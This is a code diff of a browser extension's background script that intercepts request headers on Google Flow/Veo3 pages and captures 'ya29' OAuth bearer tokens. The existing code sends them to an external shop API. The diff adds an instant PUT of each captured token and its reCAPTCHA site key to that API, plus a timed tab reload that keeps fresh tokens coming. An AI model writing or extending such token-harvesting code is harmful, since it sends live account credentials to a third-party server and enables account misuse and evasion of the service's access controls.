@@ -8,7 +8,9 @@ const FLOW_URL_PATTERNS = [
 const DEFAULT_API_URL = 'https://shop.thetaphoa.store/api/veo3-tokens'
 const DEFAULT_WS_URL = 'ws://localhost:3001'
 const AUTO_POST_ALARM = 'auto-post-tokens'
+const AUTO_REFRESH_ALARM = 'auto-refresh-page'
 const AUTO_POST_INTERVAL_MINUTES = 5
+const AUTO_REFRESH_INTERVAL_MINUTES = 5
 
 
 // ==========================================
@@ -210,6 +212,9 @@ chrome.webRequest.onBeforeSendHeaders.addListener(
         chrome.action.setBadgeText({ text: String(tokens.length) })
         chrome.action.setBadgeBackgroundColor({ color: '#4CAF50' })
       })
+
+      // ★ Instant auto-PUT: immediately send new ya29 to API
+      instantAutoPut(tokenValue)
     }
   },
   { urls: FLOW_URL_PATTERNS },
@@ -353,9 +358,12 @@ function triggerRecaptchaGeneration(siteKey) {
 // AUTO-POST: Send latest token to API
 // ==========================================
 async function autoPostLatestToken() {
-  const data = await chrome.storage.local.get(['capturedTokens', 'apiUrl', 'autoPostEnabled'])
+  const data = await chrome.storage.local.get(['capturedTokens', 'apiUrl', 'autoPostEnabled', 'capturedSiteKey'])
 
-  if (!data.autoPostEnabled) return
+  if (!data.autoPostEnabled) {
+    console.log('🔑 Auto-post: Disabled, skipping')
+    return
+  }
 
   const tokens = data.capturedTokens || []
   if (tokens.length === 0) {
@@ -366,19 +374,7 @@ async function autoPostLatestToken() {
   const apiUrl = data.apiUrl || DEFAULT_API_URL
   const latestToken = tokens[0]
 
-  // Generate a fresh reCAPTCHA token before posting
-  try {
-    const freshRecaptcha = await triggerRecaptchaGeneration()
-    if (freshRecaptcha) {
-      latestToken.recaptchaToken = freshRecaptcha
-      tokens[0] = latestToken
-      await chrome.storage.local.set({ capturedTokens: tokens })
-      console.log('🔑 Auto-post: Fresh reCAPTCHA token generated')
-    }
-  } catch (err) {
-    console.warn('🔑 Auto-post: Could not generate fresh reCAPTCHA:', err.message)
-    // Continue with existing token if any
-  }
+  // Skip reCAPTCHA generation — not needed for PUT and fails when backgrounded
 
   try {
     const getResponse = await fetch(apiUrl)
@@ -387,6 +383,7 @@ async function autoPostLatestToken() {
     const updatePayload = { value: latestToken.tokenValue }
     if (latestToken.sessionId) updatePayload.sessionId = latestToken.sessionId
     if (latestToken.projectId) updatePayload.projectId = latestToken.projectId
+    if (data.capturedSiteKey) updatePayload.siteKey = data.capturedSiteKey
 
     if (getResult.success && getResult.data && getResult.data.length > 0) {
       const existingToken = getResult.data[0]
@@ -410,7 +407,7 @@ async function autoPostLatestToken() {
         }
       })
 
-      console.log(`🔑 Auto-post PUT: ${result.success ? '✅ Success' : '❌ Failed'} — updated token ${existingToken._id}`)
+      console.log(`🔑 Auto-post PUT: ${result.success ? '✅ Success' : '❌ Failed'} — token ${existingToken._id}`)
     } else {
       const response = await fetch(apiUrl, {
         method: 'POST',
@@ -445,10 +442,84 @@ async function autoPostLatestToken() {
 
 
 
+// ==========================================
+// INSTANT AUTO-PUT: PUT ya29 to API immediately on capture
+// ==========================================
+async function instantAutoPut(tokenValue) {
+  try {
+    const data = await chrome.storage.local.get(['apiUrl', 'autoPostEnabled', 'capturedSiteKey'])
+    if (!data.autoPostEnabled) return // Only if auto-post is enabled
+
+    const apiUrl = data.apiUrl || DEFAULT_API_URL
+
+    // Get existing token from API
+    const getResponse = await fetch(apiUrl)
+    const getResult = await getResponse.json()
+
+    const updatePayload = { value: tokenValue }
+    if (data.capturedSiteKey) updatePayload.siteKey = data.capturedSiteKey
+
+    // Also include sessionId/projectId from latest captured tokens
+    const storageData = await chrome.storage.local.get(['capturedTokens'])
+    const tokens = storageData.capturedTokens || []
+    if (tokens.length > 0) {
+      if (tokens[0].sessionId) updatePayload.sessionId = tokens[0].sessionId
+      if (tokens[0].projectId) updatePayload.projectId = tokens[0].projectId
+    }
+
+    if (getResult.success && getResult.data && getResult.data.length > 0) {
+      const existingToken = getResult.data[0]
+      const response = await fetch(apiUrl, {
+        method: 'PUT',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ id: existingToken._id, ...updatePayload })
+      })
+      const result = await response.json()
+      console.log(`⚡ Instant PUT: ${result.success ? '✅' : '❌'} — ya29 ${tokenValue.substring(0, 15)}...`)
+
+      chrome.storage.local.set({
+        lastAutoPost: {
+          timestamp: new Date().toISOString(),
+          success: result.success,
+          error: result.error || null,
+          action: 'PUT (instant)'
+        }
+      })
+    }
+  } catch (err) {
+    console.warn('⚡ Instant PUT error:', err.message)
+  }
+}
+
+// ==========================================
+// AUTO-REFRESH: Reload Flow tab to get fresh ya29
+// ==========================================
+async function autoRefreshFlowTab() {
+  try {
+    const tab = await findVeo3Tab()
+    if (tab) {
+      await chrome.tabs.reload(tab.id)
+      console.log('🔄 Auto-refresh: Flow tab reloaded')
+    } else {
+      console.log('🔄 Auto-refresh: No Flow tab found')
+    }
+  } catch (err) {
+    console.warn('🔄 Auto-refresh error:', err.message)
+  }
+}
+
 // Handle alarm triggers
 chrome.alarms.onAlarm.addListener((alarm) => {
+  // Reconnect WS if disconnected
+  if (!wsConnection || wsConnection.readyState !== WebSocket.OPEN) {
+    connectWebSocket()
+  }
+
   if (alarm.name === AUTO_POST_ALARM) {
     autoPostLatestToken()
+  }
+  if (alarm.name === AUTO_REFRESH_ALARM) {
+    autoRefreshFlowTab()
   }
 })
 
@@ -548,6 +619,25 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
     return true
   }
 
+  if (message.type === 'TOGGLE_AUTO_REFRESH') {
+    const enabled = message.enabled
+    const minutes = message.minutes || AUTO_REFRESH_INTERVAL_MINUTES
+    chrome.storage.local.set({ autoRefreshEnabled: enabled, autoRefreshMinutes: minutes })
+
+    if (enabled) {
+      chrome.alarms.create(AUTO_REFRESH_ALARM, {
+        delayInMinutes: minutes,
+        periodInMinutes: minutes
+      })
+      console.log(`🔄 Auto-refresh: ENABLED (every ${minutes} min)`)
+    } else {
+      chrome.alarms.clear(AUTO_REFRESH_ALARM)
+      console.log('🔄 Auto-refresh: DISABLED')
+    }
+
+    sendResponse({ success: true, enabled })
+    return true
+  }
 
   if (message.type === 'POST_NOW') {
     autoPostLatestToken().then(() => sendResponse({ success: true }))
@@ -556,14 +646,22 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
 })
 
 // On startup, restore alarms if they were enabled
-chrome.storage.local.get(['autoPostEnabled', 'autoPostMinutes'], (result) => {
+chrome.storage.local.get(['autoPostEnabled', 'autoPostMinutes', 'autoRefreshEnabled', 'autoRefreshMinutes'], (result) => {
   if (result.autoPostEnabled) {
     const minutes = result.autoPostMinutes || AUTO_POST_INTERVAL_MINUTES
     chrome.alarms.create(AUTO_POST_ALARM, {
       delayInMinutes: 1,
       periodInMinutes: minutes
     })
-    console.log(`🔑 Auto-post: Restored alarm on startup (every ${minutes} min)`)
+    console.log(`🔑 Auto-post: Restored on startup (every ${minutes} min)`)
+  }
+  if (result.autoRefreshEnabled) {
+    const minutes = result.autoRefreshMinutes || AUTO_REFRESH_INTERVAL_MINUTES
+    chrome.alarms.create(AUTO_REFRESH_ALARM, {
+      delayInMinutes: minutes,
+      periodInMinutes: minutes
+    })
+    console.log(`🔄 Auto-refresh: Restored on startup (every ${minutes} min)`)
   }
 })
 
